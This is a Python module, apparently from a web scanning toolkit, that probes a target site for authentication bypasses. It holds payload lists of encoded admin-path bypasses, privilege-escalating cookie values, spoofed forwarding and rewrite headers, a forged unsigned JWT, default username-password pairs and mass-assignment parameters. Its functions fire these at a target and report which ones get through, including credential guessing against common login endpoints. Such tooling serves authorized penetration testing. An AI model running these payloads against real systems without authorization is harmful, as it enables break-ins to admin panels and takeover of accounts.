import copy, re, random
from typing import Dict, List, Optional
import requests

from tools.log_utils import get_logger
from tools.settings import settings

logger = get_logger("auth_bypass")

ADMIN_PATHS = [
    "/admin", "/administrator", "/admin.php", "/admin/login",
    "/wp-admin", "/phpmyadmin", "/manager", "/management",
    "/panel", "/cpanel", "/console", "/dashboard",
    "/backend", "/api/admin", "/admin/api", "/admin/panel",
    "/admin/dashboard", "/admin/console", "/admin/management",
    "/admin/index.php", "/admin/index.html", "/admin/login.php",
    "/admin/admin.php", "/admin_area", "/admin_area/admin.php",
    "/siteadmin", "/admincontrol", "/adminpanel",
    "/webadmin", "/sysadmin", "/cp", "/controlpanel",
    "/superadmin", "/admin/pages", "/admin/users",
    "/admin/settings", "/admin/config", "/admin/system",
    "/api/v1/admin", "/api/v2/admin", "/graphql",
    "/jenkins", "/jmx-console", "/actuator",
    "/swagger-ui.html", "/api-docs", "/api/swagger",
    "/debug", "/console", "/h2-console",
    "/zabbix", "/nagios", "/prometheus",
]

PATH_BYPASSES = [
    # Basic bypass patterns
    "/admin", "/admin/", "//admin//", "/./admin",
    "/admin/.", "/admin%00", "/admin%20", "/ADMIN",
    "/Admin", "/admin;foo", "/admin..;/", "/*/admin",
    "/admin/../admin", "/admin/.%00",
    # Advanced path manipulation
    "/admin%2f", "/admin\\", "/admin/./",
    "/%2fadmin", "/%2fadmin%2f",
    "/admin%3f", "/admin%23",
    "/admin..%00/", "/admin%252f",
    "/admin;%2f..;%2f", "/admin%ef%bc%8f",
    "/admin%c0%af", "/admin%c0%ae",
    # Case variants
    "/Admin%00", "/ADMIN%00/", "/aDmIn",
    "/AdMiN", "/adMIN", "/ADmin",
    # Suffix bypass
    "/admin.js", "/admin.css", "/admin.json",
    "/admin.xml", "/admin.txt", "/admin.html",
    "/admin.htm", "/admin.pdf",
    "/admin;.js", "/admin;.css",
    "/admin;.json", "/admin;.xml",
    # Double encoding
    "/%2561dmin", "/%2561%2564%256d%2569%256e",
    "/admin%252e%252e/", "/.%2561dmin",
    # Unicode bypass
    "/admin%uffoo", "/admin%u0000",
    "/ad%6d%69n", "/%61%64%6d%69%6e",
    # IIS short name
    "/admin~1", "/admin~1.php", "/admin~1.asp",
    # Traversal-like
    "/..;/..;/..;/admin",
    "/..%252f..%252f..%252fadmin",
    "/%c0%ae%c0%ae/%c0%ae%c0%ae/admin",
    # Parameter pollution
    "/?next=/admin", "/?redirect=/admin",
    "/?url=/admin", "/?page=/admin",
]

COOKIE_TAMPER_PAYLOADS = [
    {"admin": "1"}, {"admin": "true"}, {"admin": "True"},
    {"role": "admin"}, {"role": "administrator"}, {"role": "1"},
    {"is_admin": "1"}, {"is_admin": "true"}, {"user_type": "admin"},
    {"group": "admin"}, {"level": "admin"}, {"access": "admin"},
    {"superuser": "1"}, {"super_admin": "1"},
    {"admin_level": "1"}, {"administrator": "1"},
    {"user": "admin"}, {"username": "admin"},
    {"member": "admin"}, {"member_type": "admin"},
    # Additional cookie tamper payloads
    {"admin": "True"}, {"admin": "yes"}, {"admin": "on"},
    {"admin": "enabled"}, {"admin": "granted"},
    {"role": "superadmin"}, {"role": "root"},
    {"role": "system"}, {"role": "superuser"},
    {"is_admin": "True"}, {"is_admin": "yes"},
    {"is_admin": "on"}, {"is_admin": "enabled"},
    {"user_type": "superadmin"}, {"user_type": "root"},
    {"group": "wheel"}, {"group": "sudo"}, {"group": "root"},
    {"level": "10"}, {"level": "999"}, {"level": "9999"},
    {"access_level": "admin"}, {"access_level": "root"},
    {"access_level": "10"}, {"access_level": "999"},
    {"permissions": "admin"}, {"permissions": "*"},
    {"permissions": "all"}, {"permissions": "read_write"},
    {"member_type": "owner"}, {"member_type": "moderator"},
    {"member_type": "administrator"},
    {"auth": "admin"}, {"auth": "1"}, {"auth": "true"},
    {"authenticated": "1"}, {"authenticated": "true"},
    {"logged_in": "1"}, {"logged_in": "true"},
    {"login": "admin"}, {"login": "1"},
    {"session": "admin"}, {"session_level": "admin"},
    {"user_role": "admin"}, {"user_role": "1"},
    {"uid": "0"}, {"uid": "1"}, {"userid": "0"}, {"userid": "1"},
    {"user_id": "0"}, {"user_id": "1"},
    {"isLoggedIn": "true"}, {"isLoggedIn": "1"},
    {"isAuthenticated": "true"}, {"isAuthenticated": "1"},
    {"valid": "true"}, {"valid": "1"},
    {"verified": "true"}, {"verified": "1"},
    {"email_verified": "true"}, {"email_verified": "1"},
]

HEADER_INJECTIONS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Original-URL": "/"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Rewrite-URL": "/"},
    {"X-Forwarded-Proto": "https"},
    {"X-Forwarded-Port": "443"},
    {"X-Internal": "true"},
    {"X-Auth-Type": "admin"},
    {"X-Remote-User": "admin"},
    {"X-Remote-Group": "admin"},
    {"X-Auth-User": "admin"},
    # Additional header bypass techniques
    {"X-Forwarded-For": "127.0.0.1, 192.168.1.1"},
    {"X-Real-IP": "localhost"},
    {"X-Real-IP": "::1"},
    {"Client-IP": "127.0.0.1"},
    {"Client-IP": "localhost"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Original-URL": "/admin/"},
    {"X-Original-URL": "/admin/../"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/admin/"},
    {"X-Original-URL": "/wp-admin/"},
    {"X-Rewrite-URL": "/wp-admin/"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1, 10.0.0.1"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Remote-IP": "10.0.0.1"},
    {"X-Originating-IP": "10.0.0.1"},
    {"X-Custom-IP-Authorization": "10.0.0.1"},
    {"X-Forwarded-Host": "internal.local"},
    {"X-Forwarded-Server": "internal.local"},
    {"X-Forwarded-Scheme": "https"},
    {"X-URL-Scheme": "https"},
    {"Proxy-Host": "localhost"},
    {"Proxy-Host": "internal.local"},
    {"X-Real-IP": "216.58.192.142"},
    {"X-Forwarded-For": "216.58.192.142"},
    {"Client-IP": "216.58.192.142"},
    {"X-Originating-IP": "216.58.192.142"},
    # Authorization header manipulation
    {"Authorization": "Basic YWRtaW46YWRtaW4="},
    {"Authorization": "Bearer admin"},
    {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ."},
    # Hop-by-hop headers
    {"X-Auth-Token": "admin"},
    {"X-Auth-Key": "admin"},
    {"X-Server-Purge": "true"},
    {"X-Accel-Internal": "true"},
]

BYPASS_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE"]

# Mass assignment / parameter pollution payloads
MASS_ASSIGN_PAYLOADS = [
    "admin=true",
    "isAdmin=true",
    "is_admin=true",
    "role=admin",
    "user_type=admin",
    "group=admin",
    "permissions=admin",
    "access_level=admin",
    "account_type=admin",
    "user=admin",
    "username=admin",
    "authenticated=true",
    "verified=true",
    "email_verified=true",
]

# Common default credentials
DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("admin", "root"), ("admin", "toor"),
    ("admin", "pass"), ("admin", "admin1"), ("admin", "administrator"),
    ("root", "root"), ("root", "toor"), ("root", "admin"),
    ("root", "password"), ("root", ""), ("root", "root123"),
    ("user", "user"), ("user", "password"), ("user", "123456"),
    ("test", "test"), ("test", "123456"), ("test", "password"),
    ("guest", "guest"), ("guest", ""),
    ("administrator", "administrator"), ("administrator", "admin"),
    ("admin", "12345678"), ("admin", "111111"), ("admin", "000000"),
    ("admin", "qwerty"), ("admin", "letmein"),
    ("admin", "welcome"), ("admin", "monkey"),
    ("admin", "sunshine"), ("admin", "princess"),
    ("admin", "football"), ("admin", "iloveyou"),
    ("admin", "trustno1"), ("admin", "master"),
    ("admin", "login"), ("admin", "passw0rd"),
    ("admin", "p@ssword"), ("admin", "P@ssw0rd"),
    ("admin", "changeme"), ("admin", "temp123"),
    ("admin", "default"), ("admin", "system"),
    ("admin", "manager"), ("admin", "server"),
    ("admin", "backup"), ("admin", "test123"),
]

LOGIN_ENDPOINTS = [
    "/login", "/signin", "/auth", "/authenticate",
    "/api/login", "/api/auth", "/api/v1/login",
    "/api/v1/auth", "/user/login", "/users/login",
    "/admin/login", "/admin/login.php",
    "/wp-login.php", "/administrator/index.php",
    "/auth/login", "/oauth/token",
    "/api/token", "/api/v1/token",
    "/graphql", "/api/graphql",
]


def check_admin_endpoints(url: str, sess: Optional[requests.Session] = None,
                          timeout: float = 10.0) -> List[Dict]:
    if sess is None:
        sess = requests.Session(); sess.verify = settings.verify_ssl
    results = []
    base = url.rstrip("/")
    for path in ADMIN_PATHS:
        try:
            r = sess.get("%s%s" % (base, path), timeout=timeout)
            if r.status_code in (200, 301, 302, 403):
                results.append({"path": path, "status": r.status_code,
                                "length": len(r.text)})
        except Exception as e:
            logger.debug("admin endpoint %s: %s", path, e)
    return results


def check_path_bypass(url_pattern: str, sess: Optional[requests.Session] = None,
                      timeout: float = 10.0) -> List[Dict]:
    if sess is None:
        sess = requests.Session(); sess.verify = settings.verify_ssl
    results = []
    for bp in PATH_BYPASSES:
        test_url = url_pattern.replace("/admin", bp) if "/admin" in url_pattern else bp
        try:
            r = sess.get(test_url if test_url.startswith("http") else url_pattern.rstrip("/") + bp,
                         timeout=timeout)
            if r.status_code in (200, 301, 302):
                results.append({"bypass": bp, "status": r.status_code, "url": r.url})
        except Exception as e:
            logger.debug("path bypass %s: %s", bp, e)
    return results


def check_cookie_tamper(url: str, sess: Optional[requests.Session] = None,
                        timeout: float = 10.0) -> List[Dict]:
    if sess is None:
        sess = requests.Session(); sess.verify = settings.verify_ssl
    baseline = None
    try:
        baseline = sess.get(url, timeout=timeout)
    except Exception as e:
        logger.debug("cookie baseline: %s", e)
        return []
    results = []
    for payload in COOKIE_TAMPER_PAYLOADS:
        try:
            import requests as _req
            sess_copy = _req.Session()
            for cookie in sess.cookies:
                sess_copy.cookies.set(cookie.name, cookie.value)
            for k, v in payload.items():
                sess_copy.cookies.set(k, v)
            r = sess_copy.get(url, timeout=timeout)
            if r.status_code != baseline.status_code or len(r.text) != len(baseline.text):
                results.append({"cookie": payload, "status": r.status_code,
                                "length": len(r.text)})
        except Exception as e:
            logger.debug("cookie tamper %s: %s", list(payload.keys())[0], e)
    return results


def check_header_injection(url: str, sess: Optional[requests.Session] = None,
                           timeout: float = 10.0) -> List[Dict]:
    if sess is None:
        sess = requests.Session(); sess.verify = settings.verify_ssl
    baseline = None
    try:
        baseline = sess.get(url, timeout=timeout)
    except Exception as e:
        logger.debug("header baseline: %s", e)
        return []
    results = []
    for headers in HEADER_INJECTIONS:
        try:
            r = sess.get(url, headers=headers, timeout=timeout)
            if r.status_code != baseline.status_code or len(r.text) != len(baseline.text):
                results.append({"headers": headers, "status": r.status_code,
                                "length": len(r.text)})
        except Exception as e:
            logger.debug("header injection %s: %s", list(headers.keys())[0], e)
    return results


def check_method_bypass(url: str, sess: Optional[requests.Session] = None,
                        timeout: float = 10.0) -> List[Dict]:
    if sess is None:
        sess = requests.Session(); sess.verify = settings.verify_ssl
    results = []
    baseline = None
    try:
        baseline = sess.get(url, timeout=timeout)
    except Exception as e:
        logger.debug("method baseline: %s", e)
        return results
    for method in BYPASS_METHODS:
        try:
            r = sess.request(method, url, timeout=timeout)
            if r.status_code != baseline.status_code and r.status_code in (200, 201, 204):
                results.append({"method": method, "status": r.status_code,
                                "length": len(r.text)})
        except Exception as e:
            logger.debug("method %s: %s", method, e)
    return results


def check_default_creds(url: str, sess: Optional[requests.Session] = None,
                        timeout: float = 10.0) -> List[Dict]:
    if sess is None:
        sess = requests.Session(); sess.verify = settings.verify_ssl
    results = []
    base = url.rstrip("/")
    for endpoint in LOGIN_ENDPOINTS:
        login_url = "%s%s" % (base, endpoint)
        for user, password in DEFAULT_CREDS[:20]:  # Test first 20 to limit time
            try:
                r = sess.post(login_url, data={"username": user, "password": password,
                                                "email": user, "user": user, "pass": password,
                                                "user_login": user, "pwd": password},
                              timeout=timeout, allow_redirects=False)
                # Succesful login usually redirects or returns different status
                if r.status_code in (302, 301) or "token" in r.text.lower()[:500] or \
                   "session" in r.text.lower()[:500] or "welcome" in r.text.lower()[:200] or \
                   ("success" in r.text.lower()[:200] and "error" not in r.text.lower()[:200]):
                    results.append({
                        "endpoint": login_url,
                        "username": user,
                        "password": password,
                        "status": r.status_code,
                        "location": r.headers.get("Location", ""),
                    })
                    break  # Found creds for this endpoint, move on
            except Exception:
                pass
    return results


def check_mass_assignment(url: str, sess: Optional[requests.Session] = None,
                          timeout: float = 10.0) -> List[Dict]:
    if sess is None:
        sess = requests.Session(); sess.verify = settings.verify_ssl
    results = []
    base = url.rstrip("/")
    for payload in MASS_ASSIGN_PAYLOADS:
        try:
            r = sess.post(base + "/api/user/update", data=payload,
                          timeout=timeout, allow_redirects=False)
            if r.status_code in (200, 201, 202) and \
               ("success" in r.text.lower()[:300] or "true" in r.text.lower()[:300]):
                results.append({"endpoint": "/api/user/update", "payload": payload,
                                "status": r.status_code})
        except Exception:
            pass
        try:
            r = sess.post(base + "/user/profile", data=payload,
                          timeout=timeout, allow_redirects=False)
            if r.status_code in (200, 201, 202) and \
               ("success" in r.text.lower()[:300] or "true" in r.text.lower()[:300]):
                results.append({"endpoint": "/user/profile", "payload": payload,
                                "status": r.status_code})
        except Exception:
            pass
    return results


def check(url: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    r = {
        "vulnerable": False,
        "admin_endpoints": [],
        "path_bypasses": [],
        "cookie_bypasses": [],
        "header_bypasses": [],
        "method_bypasses": [],
        "default_creds": [],
        "mass_assignment": [],
    }
    if not url.startswith("http"):
        url = "http://" + url
    r["admin_endpoints"] = check_admin_endpoints(url, sess, timeout)
    r["path_bypasses"] = check_path_bypass(url, sess, timeout)
    r["cookie_bypasses"] = check_cookie_tamper(url, sess, timeout)
    r["header_bypasses"] = check_header_injection(url, sess, timeout)
    r["method_bypasses"] = check_method_bypass(url, sess, timeout)
    r["default_creds"] = check_default_creds(url, sess, timeout)
    r["mass_assignment"] = check_mass_assignment(url, sess, timeout)
    total = len(r["path_bypasses"]) + len(r["cookie_bypasses"]) + \
            len(r["header_bypasses"]) + len(r["method_bypasses"]) + \
            len(r["default_creds"]) + len(r["mass_assignment"])
    r["vulnerable"] = total > 0
    r["total_bypasses"] = total
    return r
